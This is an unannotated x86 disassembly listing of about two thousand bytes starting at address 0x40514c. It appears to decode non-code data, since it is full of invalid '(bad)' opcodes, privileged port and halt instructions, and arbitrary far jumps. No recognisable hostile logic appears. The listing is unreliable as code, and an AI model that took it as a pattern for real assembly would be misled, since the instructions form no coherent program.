  40514c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40514d:	or     al,0xc1
  40514f:	ret    0x7e7
  405152:	fidiv  DWORD PTR [ebp-0x793db1b5]
  405158:	(bad)  
  405159:	and    esp,eax
  40515b:	shr    BYTE PTR [edi+0x4532390b],cl
  405161:	fidivr WORD PTR ds:0xe0894e15
  405167:	add    esp,eax
  405169:	pop    edi
  40516a:	xchg   BYTE PTR [eax],ah
  40516c:	cmp    al,0x7f
  40516e:	into   
  40516f:	int    0x11
  405171:	stc    
  405172:	fadd   QWORD PTR [ecx-0x6ff643de]
  405178:	adc    esp,DWORD PTR [ecx+edi*2-0x40]
  40517c:	push   0x7b
  40517e:	lods   al,BYTE PTR ds:[esi]
  40517f:	shl    DWORD PTR [ebx+0x79e129b2],cl
  405185:	repnz push ds
  405187:	jbe    0x405201
  405189:	and    ebx,DWORD PTR [ecx-0x67]
  40518c:	and    eax,0xb2e2253c
  405191:	je     0x40513c
  405193:	aam    0x43
  405195:	push   0x8b084eec
  40519a:	mov    ah,0xdd
  40519c:	fbstp  TBYTE PTR [esp+ebp*8+0x313c0a52]
  4051a3:	aaa    
  4051a4:	cmp    BYTE PTR [ebx],bh
  4051a6:	out    0x24,al
  4051a8:	mov    esp,0x9362871f
  4051ad:	inc    edx
  4051ae:	ja     0x405227
  4051b0:	(bad)  
  4051b1:	push   edx
  4051b2:	sbb    eax,DWORD PTR [ecx-0x7af5f045]
  4051b8:	pop    eax
  4051b9:	push   ds
  4051ba:	pop    edi
  4051bb:	cmp    al,0x6
  4051bd:	dec    edi
  4051be:	mov    ebx,0x23bb2af8
  4051c3:	loope  0x40516e
  4051c5:	mov    al,0x90
  4051c7:	jl     0x405208
  4051c9:	inc    edi
  4051ca:	xchg   ebx,eax
  4051cb:	adc    DWORD PTR [ebp+0x35789e6],0xf4cdaaaa
  4051d5:	sar    DWORD PTR [edi-0x27],1
  4051d8:	bound  eax,QWORD PTR [ecx-0x46e1e836]
  4051de:	fisubr DWORD PTR ds:0x5d3b9c6a
  4051e4:	sub    ah,BYTE PTR [eax+eax*2-0x5c]
  4051e8:	xlat   BYTE PTR ds:[ebx]
  4051e9:	lock xor BYTE PTR [ebx+ecx*8-0x155abef0],0x94
  4051f2:	in     eax,0xf3
  4051f4:	lods   al,BYTE PTR ds:[esi]
  4051f5:	test   DWORD PTR [ecx+0x24],eax
  4051f8:	icebp  
  4051f9:	leave  
  4051fa:	mov    ebx,0xc2862515
  4051ff:	push   ecx
  405200:	fs cld 
  405202:	fistp  WORD PTR [ebx]
  405204:	not    DWORD PTR [ecx]
  405206:	vcmpps ymm7,ymm0,YMMWORD PTR [edx-0xd727922],0xa6
  40520f:	loop   0x4051d2
  405211:	jnp    0x405229
  405213:	or     eax,0x54fd062
  405218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40521a:	aaa    
  40521b:	jo     0x4051ab
  40521d:	adc    ecx,DWORD PTR [eax+eax*4-0x2e]
  405221:	add    ah,0x66
  405224:	stos   BYTE PTR es:[edi],al
  405225:	add    DWORD PTR ds:[ebx+eax*8-0x1c2c8dc6],edx
  40522d:	jbe    0x4051ef
  40522f:	test   esi,0x94380340
  405235:	adc    ch,BYTE PTR [ebx-0x31]
  405238:	test   DWORD PTR [ecx-0x7134e7a9],esi
  40523e:	or     BYTE PTR [ecx],bh
  405240:	mov    bh,BYTE PTR [edi]
  405242:	xor    bh,0xe8
  405245:	sub    edx,DWORD PTR [bp+si-0x1886]
  40524a:	push   ebp
  40524b:	mov    ch,0x3b
  40524d:	fcomp  QWORD PTR [esi]
  40524f:	dec    edx
  405250:	xchg   ecx,eax
  405251:	test   al,0x99
  405253:	mov    BYTE PTR [edx],bl
  405255:	ss xchg edi,eax
  405257:	in     al,0x92
  405259:	sub    eax,0x68b1ce8
  40525e:	pop    es
  40525f:	xchg   BYTE PTR [eax+0x7e],ah
  405262:	outs   dx,DWORD PTR ds:[esi]
  405263:	add    ah,dh
  405265:	(bad)  
  405266:	sbb    ecx,DWORD PTR [edi]
  405268:	mov    edx,0xcfb3d6f9
  40526d:	and    bl,bl
  40526f:	rcr    DWORD PTR ds:0x2585c46d,cl
  405275:	add    eax,0xfb54e9ca
  40527a:	pop    edi
  40527b:	cwde   
  40527c:	clc    
  40527d:	xchg   edi,eax
  40527e:	hlt    
  40527f:	loopne 0x4052d3
  405281:	push   eax
  405282:	ret    0x362c
  405285:	fwait
  405286:	inc    esi
  405287:	push   esp
  405288:	out    dx,al
  405289:	sbb    al,BYTE PTR [edx+0x7e]
  40528c:	pop    eax
  40528d:	outs   dx,DWORD PTR ds:[esi]
  40528e:	gs mov ch,0x5f
  405291:	mov    edx,DWORD PTR [ebx-0x7f]
  405294:	je     0x405272
  405296:	jo     0x405238
  405298:	xchg   ebp,eax
  405299:	inc    ecx
  40529a:	imul   BYTE PTR [esi-0x66]
  40529d:	cmc    
  40529e:	push   edi
  40529f:	mov    ecx,0xe46a4f2f
  4052a4:	or     al,BYTE PTR [ebp-0x13174a92]
  4052aa:	add    bh,al
  4052ac:	rcr    DWORD PTR [ecx-0x3cf8041f],cl
  4052b2:	push   ebp
  4052b3:	fmul   st(4),st
  4052b5:	push   0x72caf483
  4052ba:	mov    ebx,0x6fa46ecb
  4052bf:	gs pop ecx
  4052c1:	dec    esi
  4052c2:	add    edi,ebx
  4052c4:	shr    BYTE PTR [eax-0x10],0x1
  4052c8:	jle    0x405262
  4052ca:	cmp    eax,0xd252baed
  4052cf:	(bad)  
  4052d0:	cmp    DWORD PTR ss:[eax-0x36e7a0e6],0x294df6b
  4052db:	adc    BYTE PTR [edi+esi*2+0x7e953f94],al
  4052e2:	es jg  0x405333
  4052e5:	(bad)  
  4052e6:	xlat   BYTE PTR ds:[ebx]
  4052e7:	jg     0x40533a
  4052e9:	es enter 0xb709,0x86
  4052ee:	sti    
  4052ef:	mov    esp,0x47db39bb
  4052f4:	adc    al,0x6e
  4052f6:	data16 and al,0x8c
  4052f9:	cli    
  4052fa:	push   cs
  4052fb:	push   eax
  4052fc:	xor    BYTE PTR [edx],dh
  4052fe:	xchg   BYTE PTR [eax],al
  405300:	push   esi
  405301:	imul   edx,DWORD PTR [edx],0x52
  405304:	mov    bl,0x62
  405306:	lahf   
  405307:	jnp    0x40536a
  405309:	lods   al,BYTE PTR ds:[esi]
  40530a:	mov    edx,0x1ade15f4
  40530f:	(bad)  
  405310:	cmp    eax,0x9262c91b
  405315:	push   ss
  405316:	clc    
  405317:	and    al,0x8a
  405319:	int    0x25
  40531b:	lods   eax,DWORD PTR ds:[esi]
  40531c:	or     al,0x4f
  40531e:	jl     0x4052a4
  405320:	mov    dl,BYTE PTR [eax]
  405322:	xlat   BYTE PTR ds:[ebx]
  405323:	fbld   TBYTE PTR [edx-0x28402f1e]
  405329:	xlat   BYTE PTR ds:[ebx]
  40532a:	dec    edi
  40532b:	xchg   DWORD PTR [esi-0x6164e268],ebx
  405331:	(bad)  
  405332:	cmp    al,0xd9
  405334:	dec    eax
  405335:	xchg   ebx,eax
  405336:	clc    
  405337:	or     eax,0x86d0c3a5
  40533c:	mov    esi,0x7440fb2e
  405341:	mov    ecx,0x137600d4
  405346:	push   ds
  405347:	and    eax,0xb89745b8
  40534c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534d:	jmp    0x2b5c:0x8a12d103
  405354:	aaa    
  405355:	sbb    BYTE PTR [ecx],0x86
  405358:	sub    DWORD PTR [ebx+0x1d],ebp
  40535b:	jne    0x4052ea
  40535d:	push   edi
  40535e:	mov    DWORD PTR [ebp+esi*2-0x4],edx
  405362:	ror    DWORD PTR [edx-0x7],1
  405365:	mov    ecx,0xd20e8f12
  40536a:	hlt    
  40536b:	mov    ebp,0x38bcd3de
  405370:	mov    ebp,0xadf7c793
  405375:	pop    esp
  405376:	push   es
  405377:	xchg   ebx,eax
  405378:	jge    0x40539e
  40537a:	popa   
  40537b:	loope  0x4053d9
  40537d:	lock adc BYTE PTR [eax-0x66],ch
  405381:	mov    ebx,eax
  405383:	sahf   
  405384:	sub    BYTE PTR [esi-0x11dde77f],bh
  40538a:	popa   
  40538b:	push   cs
  40538c:	outs   dx,BYTE PTR ds:[esi]
  40538d:	dec    esp
  40538e:	loop   0x405397
  405390:	outs   dx,BYTE PTR ds:[esi]
  405391:	sahf   
  405392:	xor    al,0x3c
  405394:	mov    eax,ds:0x1fc1ea4a
  405399:	mov    bh,0x6b
  40539b:	and    edx,DWORD PTR [edx+0x32]
  40539e:	pusha  
  40539f:	cmp    edx,DWORD PTR [edi]
  4053a1:	or     BYTE PTR ds:0xdcc557ca,dl
  4053a7:	ret    0x9d49
  4053aa:	or     eax,DWORD PTR [bx]
  4053ad:	mov    al,ds:0x8c8051d7
  4053b2:	xchg   esi,eax
  4053b3:	inc    edi
  4053b4:	ret    
  4053b5:	lock clts 
  4053b8:	mov    ecx,0xabedd329
  4053bd:	jnp    0x4053ad
  4053bf:	test   eax,0xb4854c9d
  4053c4:	test   DWORD PTR [esi-0x73],eax
  4053c7:	add    BYTE PTR [edx-0x3a],dh
  4053ca:	dec    ebx
  4053cb:	xor    BYTE PTR [ebp-0xd4ba21c],al
  4053d1:	stos   DWORD PTR es:[edi],eax
  4053d2:	push   ss
  4053d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053d4:	push   ebp
  4053d5:	lahf   
  4053d6:	jae    0x405450
  4053d8:	gs inc edx
  4053da:	rcr    dl,cl
  4053dc:	mov    edx,0x3eadbc15
  4053e1:	in     eax,0x51
  4053e3:	mov    cl,0x2c
  4053e5:	pop    ds
  4053e6:	push   ss
  4053e7:	cmp    bh,cl
  4053e9:	cli    
  4053ea:	xor    ch,cl
  4053ec:	jp     0x4053ad
  4053ee:	mov    al,0xb7
  4053f0:	fwait
  4053f1:	push   ebp
  4053f2:	in     eax,dx
  4053f3:	ss dec edx
  4053f5:	adc    esp,eax
  4053f7:	jo     0x4053c0
  4053f9:	fnstsw WORD PTR [esi+0x45]
  4053fc:	add    al,0xbe
  4053fe:	xchg   edx,eax
  4053ff:	or     al,BYTE PTR [ebp+0x2a]
  405402:	pop    edx
  405403:	mov    ds:0x2de85b6a,eax
  405408:	enter  0xe2d0,0x9a
  40540c:	fimul  WORD PTR [esi-0x4deca32]
  405412:	scas   eax,DWORD PTR es:[edi]
  405413:	std    
  405414:	dec    edx
  405415:	lahf   
  405416:	stc    
  405417:	xor    al,BYTE PTR [edx+0x17fbfbac]
  40541d:	jge    0x405406
  40541f:	sti    
  405420:	outs   dx,BYTE PTR ds:[esi]
  405421:	lods   eax,DWORD PTR ds:[esi]
  405422:	mov    edi,0x55eee402
  405427:	stos   DWORD PTR es:[edi],eax
  405428:	aaa    
  405429:	fnstenvw [edi-0x51bbbfbf]
  405430:	stos   BYTE PTR es:[edi],al
  405431:	out    dx,eax
  405432:	adc    esi,DWORD PTR [edi+0x3b]
  405435:	in     al,dx
  405436:	mov    ds:0x72f57994,eax
  40543b:	xchg   DWORD PTR cs:[edx+0x21daf51b],esp
  405442:	cmp    eax,DWORD PTR [ebx]
  405444:	push   0xe49c26ae
  405449:	lea    edx,[edx-0x46]
  40544c:	and    BYTE PTR [esi],ah
  40544e:	mov    eax,0x474de147
  405453:	push   eax
  405454:	pop    ds
  405455:	cli    
  405456:	push   ss
  405457:	lds    edi,FWORD PTR [ecx+0x65]
  40545a:	inc    esi
  40545b:	lds    ebx,FWORD PTR [edi-0x49]
  40545e:	int    0xae
  405460:	or     edx,ecx
  405462:	push   ebx
  405463:	daa    
  405464:	jbe    0x4054ca
  405466:	popa   
  405467:	inc    ecx
  405468:	xor    ecx,esi
  40546a:	xor    BYTE PTR [ebx],0x4
  40546d:	fdivr  st,st(1)
  40546f:	add    eax,0xafcac3d6
  405474:	fcom   st(1)
  405476:	mov    ah,bl
  405478:	xchg   esi,eax
  405479:	push   ecx
  40547a:	popa   
  40547b:	mov    bl,ch
  40547d:	add    ebx,edi
  40547f:	sub    ecx,esp
  405481:	fs inc edx
  405483:	mov    ah,0xf9
  405485:	xchg   ecx,eax
  405486:	nop
  405487:	ja     0x405440
  405489:	jo     0x405425
  40548b:	mov    edi,0x1686b350
  405490:	aas    
  405491:	out    dx,eax
  405492:	add    eax,0x42bd1546
  405497:	push   0xa
  405499:	or     eax,0xbc9e7984
  40549e:	stc    
  40549f:	fldcw  WORD PTR [edx+0x6b]
  4054a2:	pop    es
  4054a3:	pop    ebp
  4054a4:	mov    esp,0x567f34db
  4054a9:	cmc    
  4054aa:	popf   
  4054ab:	adc    al,0xd5
  4054ad:	and    eax,0x5a54b0bd
  4054b2:	sar    DWORD PTR [ecx+0x61],0xf6
  4054b6:	out    dx,al
  4054b7:	cdq    
  4054b8:	jmp    0x8a03:0x800b7bd8
  4054bf:	push   esi
  4054c0:	stos   DWORD PTR es:[edi],eax
  4054c1:	and    eax,0xb76049b9
  4054c6:	popf   
  4054c7:	ss cwde 
  4054c9:	pop    ecx
  4054ca:	or     dl,BYTE PTR [esi+0x344c710a]
  4054d0:	(bad)  
  4054d1:	loope  0x4054a5
  4054d3:	pop    edi
  4054d4:	mov    ch,0xc1
  4054d6:	lahf   
  4054d7:	push   ecx
  4054d8:	fisttp WORD PTR [ebx-0x172a8c68]
  4054de:	loop   0x4054bd
  4054e0:	stos   DWORD PTR es:[edi],eax
  4054e1:	rcr    BYTE PTR [ecx-0x37e75fdc],cl
  4054e7:	push   cs
  4054e8:	sti    
  4054e9:	sbb    BYTE PTR [eax-0x14beb2f2],bl
  4054ef:	cmp    BYTE PTR [ecx],bl
  4054f1:	ret    0xa2ca
  4054f4:	loop   0x40549e
  4054f6:	daa    
  4054f7:	lds    eax,FWORD PTR [ebp-0x63]
  4054fa:	mov    bh,0xb9
  4054fc:	cmc    
  4054fd:	std    
  4054fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054ff:	dec    esi
  405500:	(bad)  
  405501:	lea    edi,[edx-0x21233d7e]
  405507:	sbb    al,0x35
  405509:	xchg   edi,eax
  40550a:	hlt    
  40550b:	(bad)  
  40550c:	shld   DWORD PTR [esi],ebx,cl
  40550f:	fmul   QWORD PTR [ebp+0x5a6ea6b3]
  405515:	ja     0x40556c
  405517:	add    edi,DWORD PTR [esi-0x1f]
  40551a:	imul   dh
  40551c:	ja     0x4054dd
  40551e:	pop    edi
  40551f:	mov    ds:0xd6d15fb0,al
  405524:	cs mov al,0x6
  405527:	push   ecx
  405528:	dec    esi
  405529:	imul   edi
  40552b:	mov    edi,0xccd74a90
  405530:	mov    ch,0xc9
  405532:	cli    
  405533:	mov    dh,BYTE PTR ds:0x83327f7d
  405539:	push   0xffffff96
  40553b:	test   BYTE PTR [ebp-0x3bb49e48],cl
  405541:	or     al,BYTE PTR [ecx+0x4f4deaab]
  405547:	add    ebp,DWORD PTR [esi+0x4fa55b5]
  40554d:	sbb    BYTE PTR [edi],cl
  40554f:	ins    DWORD PTR es:[edi],dx
  405550:	and    dh,BYTE PTR [ebp+0x6d555f18]
  405556:	mov    ebp,0x5916811
  40555b:	cmp    cl,BYTE PTR [ebp-0xb]
  40555e:	adc    edi,DWORD PTR [eax]
  405560:	xor    al,bl
  405562:	push   0x303aa538
  405567:	stos   DWORD PTR es:[edi],eax
  405568:	jmp    DWORD PTR [edx-0x464aab6b]
  40556e:	int3   
  40556f:	lock imul edi,DWORD PTR ds:0x847a04a6,0xffffffba
  405577:	or     eax,0x255f1912
  40557c:	and    cl,dl
  40557e:	add    eax,0x219c942d
  405583:	pop    edx
  405584:	imul   esp,DWORD PTR [ebx-0x77965f42],0x57531f6a
  40558e:	rcl    DWORD PTR [ebx+eax*8-0x6d70e101],1
  405595:	inc    ebx
  405596:	aas    
  405597:	mov    DWORD PTR [edx+0x2e],ebp
  40559a:	das    
  40559b:	nop
  40559c:	(bad)
  40559f:	jge    0x40556b
  4055a1:	nop
  4055a2:	mov    ds:0x8e285899,al
  4055a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055a8:	lods   al,BYTE PTR ds:[esi]
  4055a9:	cdq    
  4055aa:	fisttp QWORD PTR [ebx+0x6b]
  4055ad:	outs   dx,BYTE PTR ds:[esi]
  4055ae:	pusha  
  4055af:	xor    al,0x25
  4055b1:	cli    
  4055b2:	popa   
  4055b3:	xchg   ebp,eax
  4055b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055b5:	dec    esi
  4055b6:	jmp    0xef087f2b
  4055bb:	mov    ds:0xe6928473,eax
  4055c0:	enter  0x8322,0x40
  4055c4:	inc    ecx
  4055c5:	pop    eax
  4055c6:	mov    ecx,0xe52e228b
  4055cb:	jle    0x40562d
  4055cd:	pop    esp
  4055ce:	fmulp  st(5),st
  4055d0:	push   ebx
  4055d1:	sti    
  4055d2:	push   0xffffffa1
  4055d4:	adc    al,0x9a
  4055d6:	jge    0x4055ef
  4055d8:	scas   eax,DWORD PTR es:[edi]
  4055d9:	shl    BYTE PTR [edi+eax*1],cl
  4055dc:	imul   ecx,DWORD PTR [edi-0x3c],0x80153a1c
  4055e3:	adc    eax,0xa4979581
  4055e8:	nop
  4055e9:	mov    WORD PTR [edi-0x1],?
  4055ec:	(bad)  
  4055ed:	mov    DWORD PTR [esi-0x38d2579a],edi
  4055f3:	or     al,0xab
  4055f5:	bound  eax,QWORD PTR [ecx]
  4055f7:	scas   eax,DWORD PTR es:[edi]
  4055f8:	ins    BYTE PTR es:[edi],dx
  4055f9:	out    0x4,al
  4055fb:	sbb    ecx,edx
  4055fd:	xor    ah,BYTE PTR [esi]
  4055ff:	pushf  
  405600:	retf   0x2322
  405603:	sub    DWORD PTR [eax],edx
  405605:	aad    0x13
  405607:	outs   dx,BYTE PTR ds:[esi]
  405608:	and    DWORD PTR ds:0x182d718f,eax
  40560e:	sar    BYTE PTR [ecx+eax*8-0x4b],1
  405612:	xchg   esi,eax
  405613:	pop    ecx
  405614:	nop
  405615:	sbb    eax,0x877865c
  40561a:	fwait
  40561b:	xor    bl,BYTE PTR [edi+ebp*8-0x1a]
  40561f:	xchg   esp,eax
  405620:	sbb    DWORD PTR [ecx+edx*4],0xccbce597
  405627:	push   ebp
  405628:	jns    0x405663
  40562a:	mov    edx,0x83a6fbb4
  40562f:	shl    BYTE PTR [edx-0x33],1
  405632:	pop    ecx
  405633:	in     al,dx
  405634:	loopne 0x405656
  405636:	popf   
  405637:	mov    ebx,0xc2341c90
  40563c:	retf   
  40563d:	mov    ah,ch
  40563f:	bound  esp,QWORD PTR [eax+esi*4]
  405642:	and    al,0x30
  405644:	leave  
  405645:	rcr    BYTE PTR [edi-0x3706bbe9],0xa3
  40564c:	cmp    al,0xca
  40564e:	xchg   BYTE PTR [ebx],ah
  405650:	xchg   ebx,eax
  405651:	dec    esi
  405652:	scas   eax,DWORD PTR es:[edi]
  405653:	scas   al,BYTE PTR es:[edi]
  405654:	ja     0x4056b5
  405656:	leave  
  405657:	jmp    0x4056b1
  405659:	call   0xb442:0x694a4964
  405660:	adc    al,0x15
  405662:	aas    
  405663:	retf   0x2034
  405666:	(bad)  
  405667:	xor    al,al
  405669:	jle    0x4056c1
  40566b:	xchg   ebp,eax
  40566c:	call   0x10bc:0xbddf9393
  405673:	mov    ds:0x7d0dceb1,al
  405678:	push   0x35119626
  40567d:	fs ds cmc 
  405680:	or     ah,ah
  405682:	jne    0x405695
  405684:	mov    dl,BYTE PTR [ecx-0x27]
  405687:	mov    ch,0x4e
  405689:	mov    ah,0xbe
  40568b:	cmp    ebx,DWORD PTR [edi]
  40568d:	push   esp
  40568e:	push   ds
  40568f:	dec    eax
  405690:	adc    eax,0x3c577458
  405695:	aas    
  405696:	ja     0x4056c2
  405698:	fiadd  DWORD PTR [ecx-0x4e]
  40569b:	add    BYTE PTR [edx+0x7aeb3f90],dh
  4056a1:	xor    ebp,DWORD PTR [esi-0x6]
  4056a4:	out    0x17,al
  4056a6:	pop    es
  4056a7:	push   eax
  4056a8:	push   esp
  4056a9:	push   es
  4056aa:	xor    BYTE PTR [esi+edi*1],al
  4056ad:	add    eax,0x5117742d
  4056b2:	push   esp
  4056b3:	mov    bl,ch
  4056b5:	das    
  4056b6:	pop    es
  4056b7:	sub    DWORD PTR [esi-0x71b99449],eax
  4056bd:	jl     0x4056c8
  4056bf:	ret    0x7695
  4056c2:	mov    edx,0xceba6689
  4056c7:	sub    esp,DWORD PTR [esi-0x289db9c6]
  4056cd:	xchg   ebx,eax
  4056ce:	lods   eax,DWORD PTR ds:[esi]
  4056cf:	cld    
  4056d0:	jae    0x4056a4
  4056d2:	push   ebx
  4056d3:	cmp    DWORD PTR [edx],edx
  4056d5:	pop    ecx
  4056d6:	es dec ebp
  4056d8:	inc    esi
  4056d9:	aas    
  4056da:	sahf   
  4056db:	sahf   
  4056dc:	(bad)  
  4056dd:	mov    bl,0x5f
  4056df:	(bad)  
  4056e1:	add    ah,BYTE PTR [edx-0x28a70ed8]
  4056e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056e8:	aam    0xc2
  4056ea:	push   esi
  4056eb:	push   es
  4056ec:	popf   
  4056ed:	fcom   QWORD PTR [esi+0x2b9adc10]
  4056f3:	cmp    al,0xf5
  4056f5:	aas    
  4056f6:	es pop esp
  4056f8:	and    DWORD PTR [esp+edx*1],edi
  4056fb:	(bad)  
  4056fd:	adc    BYTE PTR [ecx+0x1c84e7b0],cl
  405703:	or     al,0xd1
  405705:	and    dh,BYTE PTR [edi+0x69f137f5]
  40570b:	add    esp,eax
  40570d:	lahf   
  40570e:	imul   eax,DWORD PTR [ebx],0x8f424cae
  405714:	sub    al,0xc6
  405716:	cld    
  405717:	icebp  
  405718:	jnp    0x405725
  40571a:	mov    esp,0xb7beb44e
  40571f:	dec    eax
  405720:	lea    edi,[ebp+0x6c]
  405723:	cmp    al,0x61
  405725:	xchg   esi,eax
  405726:	mov    ecx,0x1cb6d51
  40572b:	sbb    DWORD PTR [ebp-0x5414480f],ebx
  405731:	push   cs
  405732:	and    eax,0x5058034c
  405737:	mov    dl,0xe4
  405739:	(bad)  
  40573a:	xor    esi,edx
  40573c:	enter  0x3cd6,0x7a
  405740:	mov    ecx,0xdce6be96
  405745:	hlt    
  405746:	rol    dh,cl
  405748:	mov    DWORD PTR [ebx],ebp
  40574a:	sbb    eax,0xc523ae0b
  40574f:	fisub  WORD PTR [ecx+0x3d]
  405752:	mov    esp,0x825ef404
  405757:	mov    ds:0x28e3143c,eax
  40575c:	and    al,0xf
  40575e:	pop    eax
  40575f:	xchg   edi,eax
  405760:	sbb    eax,0x7a819c6f
  405765:	push   ebp
  405766:	data16 or al,0x74
  405769:	call   0xcf9f9703
  40576e:	(bad)  
  40576f:	xchg   edx,eax
  405770:	inc    esi
  405771:	adc    DWORD PTR [edx],ebp
  405773:	dec    esp
  405774:	mov    ds:0x2da9a047,al
  405779:	int3   
  40577a:	dec    edx
  40577b:	push   ecx
  40577c:	xlat   BYTE PTR ds:[ebx]
  40577d:	arpl   di,cx
  40577f:	or     al,0xe0
  405781:	xchg   esp,eax
  405782:	jno    0x405776
  405784:	push   ebp
  405785:	adc    eax,0xbcd20626
  40578a:	pop    ebx
  40578b:	mov    ds:0x2e2d8a18,al
  405790:	aaa    
  405791:	mov    bl,BYTE PTR [eax-0x3e]
  405794:	retf   
  405795:	cld    
  405796:	fnsave [edi]
  405798:	xor    al,0xa9
  40579a:	jns    0x40572e
  40579c:	jnp    0x405798
  40579e:	div    ch
  4057a0:	shl    BYTE PTR [ebp+0x20f28ca],1
  4057a6:	iret   
  4057a7:	sub    dl,BYTE PTR [edx+0x2c]
  4057aa:	pop    ecx
  4057ab:	push   cs
  4057ac:	retf   0x38ab
  4057af:	cmp    DWORD PTR [edi+0xc],ebx
  4057b2:	iret   
  4057b3:	xlat   BYTE PTR ds:[ebx]
  4057b4:	mov    esp,DWORD PTR [edx-0x42]
  4057b7:	ds xor eax,0x2c139154
  4057bd:	dec    ebp
  4057be:	sub    eax,DWORD PTR [eax+esi*8-0x7434559]
  4057c5:	adc    al,0xec
  4057c7:	rcr    DWORD PTR [eax],0xba
  4057ca:	ror    edx,cl
  4057cc:	sub    al,0xac
  4057ce:	mov    ah,0x18
  4057d0:	and    dh,al
  4057d2:	fnsave [edi+0x5bb353bb]
  4057d8:	arpl   WORD PTR [eax],ax
  4057da:	outs   dx,DWORD PTR ds:[esi]
  4057db:	data16 icebp 
  4057dd:	cmp    DWORD PTR [edi],0x75e434aa
  4057e3:	and    ah,BYTE PTR ds:0xe03e69fc
  4057e9:	ja     0x405789
  4057eb:	mov    edx,?
  4057ed:	rcr    DWORD PTR [esi+0x11],0xec
  4057f1:	sbb    dh,BYTE PTR [edi]
  4057f3:	test   al,0x5
  4057f5:	and    al,BYTE PTR [esp+edi*8+0x32c2c942]
  4057fc:	js     0x40581c
  4057fe:	ins    DWORD PTR es:[edi],dx
  4057ff:	cdq    
  405800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405801:	or     eax,0x196540db
  405806:	into   
  405807:	ja     0x4057e9
  405809:	mov    dl,0x64
  40580b:	mov    edi,ebx
  40580d:	bound  esp,QWORD PTR [edx+0x73315f33]
  405813:	sbb    BYTE PTR [ecx+edx*1-0x80],0xc
  405818:	hlt    
  405819:	pop    es
  40581a:	iret   
  40581b:	jmp    0x299f:0xc8f661ef
  405822:	div    esp
  405824:	pusha  
  405825:	jno    0x40588d
  405827:	nop
  405828:	test   DWORD PTR [ebx],edx
  40582a:	fsubr  QWORD PTR [ecx-0x14]
  40582d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40582e:	or     eax,0x7d6cf542
  405833:	mov    ah,0xe8
  405835:	cmc    
  405836:	pop    edi
  405837:	mov    WORD PTR ds:0x7a7a6419,fs
  40583d:	bound  ebp,QWORD PTR [edi]
  40583f:	push   ecx
  405840:	xchg   ebp,eax
  405841:	cld    
  405842:	or     al,0x95
  405844:	sub    DWORD PTR [eax+0x46],ebx
  405847:	pop    ds
  405848:	sbb    al,0x97
  40584a:	jno    0x405866
  40584c:	out    dx,eax
  40584d:	jle    0x40588f
  40584f:	pop    esp
  405850:	out    0x17,eax
  405852:	mov    ebx,0x7711964
  405857:	and    eax,0x390eeb32
  40585c:	stc    
  40585d:	dec    edi
  40585e:	ror    DWORD PTR [ecx+edx*4+0x78fd24f1],cl
  405865:	popf   
  405866:	ins    DWORD PTR es:[edi],dx
  405867:	aas    
  405868:	inc    eax
  405869:	and    DWORD PTR [edx-0x2d253ae4],esp
  40586f:	sub    eax,0x23a00277
  405874:	and    DWORD PTR [esi-0x3743dc0a],ebp
  40587a:	sub    edi,edx
  40587c:	cmpxchg DWORD PTR [ecx+0x7234f5ee],eax
  405883:	dec    edx
  405884:	dec    ebp
  405885:	sti    
  405886:	mov    esi,0xb272abaa
  40588b:	arpl   WORD PTR [edi-0x74],sp
  40588e:	pop    esp
  40588f:	fst    DWORD PTR [ebx-0x629607c3]
  405895:	fcomp  st(2)
  405897:	inc    edi
  405898:	mov    edi,0x12376d9b
  40589d:	loop   0x4058ac
  40589f:	sbb    ecx,0x9457b87d
  4058a5:	scas   al,BYTE PTR es:[edi]
  4058a6:	aas    
  4058a7:	js     0x405927
  4058a9:	inc    ebp
  4058aa:	frstor [ebp+0x6ec59aea]
  4058b0:	mov    dl,BYTE PTR [ebp-0x50559fd4]
  4058b6:	pop    esp
  4058b7:	xlat   BYTE PTR ds:[ebx]
  4058b8:	jmp    esi
  4058ba:	clc    
  4058bb:	jbe    0x405905
  4058bd:	push   edi
  4058be:	repnz hlt 
  4058c0:	adc    edi,DWORD PTR [edx-0x16]
  4058c3:	scas   eax,DWORD PTR es:[di]
  4058c5:	xchg   ecx,eax
  4058c6:	in     eax,dx
  4058c7:	xor    esp,esp
  4058c9:	sub    eax,0x257de6b0
  4058ce:	out    dx,eax
  4058cf:	dec    edi
  4058d0:	fs pop ss
  4058d2:	out    0x65,eax
  4058d4:	int    0x3f
  4058d6:	sub    al,0xee
  4058d8:	(bad)  
  4058d9:	bound  ebp,QWORD PTR [ecx-0x7b]
  4058dc:	pop    esp
  4058dd:	dec    esi
  4058de:	clc    
  4058df:	imul   ebp,esi,0x54587d1d
  4058e5:	out    0xc7,al
  4058e7:	mov    ebx,0x8dd2d38a
  4058ec:	fwait
  4058ed:	sub    esp,ecx
  4058ef:	push   eax
  4058f0:	xor    al,0x70
  4058f2:	sbb    cl,bh
  4058f4:	mov    edi,0x26e24e34
  4058f9:	daa    
  4058fa:	xor    eax,DWORD PTR [ecx-0x64]
  4058fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058fe:	pop    esi
  4058ff:	jae    0x4058a8
  405901:	daa    
  405902:	rcl    DWORD PTR [esi*1-0x1407196c],0x56
  40590a:	jmp    DWORD PTR [esp+esi*1]
  40590d:	xchg   esi,eax
  40590e:	sbb    DWORD PTR [esi-0x44326d75],edx
  405914:	(bad)  
  405915:	fstp   TBYTE PTR [ebp+0x90012dc]
  40591b:	loopne 0x4058f8
  40591d:	mov    eax,0x1b8ed9b9
  405922:	jle    0x405964
  405924:	cmp    eax,0xeb61e028
  405929:	xchg   ebx,eax
  40592a:	es inc ecx
  40592c:	js     0x405935
  40592e:	dec    ebp
  40592f:	xchg   BYTE PTR [ecx],al
  405931:	out    dx,eax
  405932:	fsubr  QWORD PTR ds:0xedaa6f97
  405938:	push   0x1
  40593a:	push   esp
  40593b:	jmp    0xee35:0xcda9ce42
  405942:	pop    ebp
  405943:	pop    ebx
  405944:	ja     0x4059c0
  405946:	jl     0x40599c
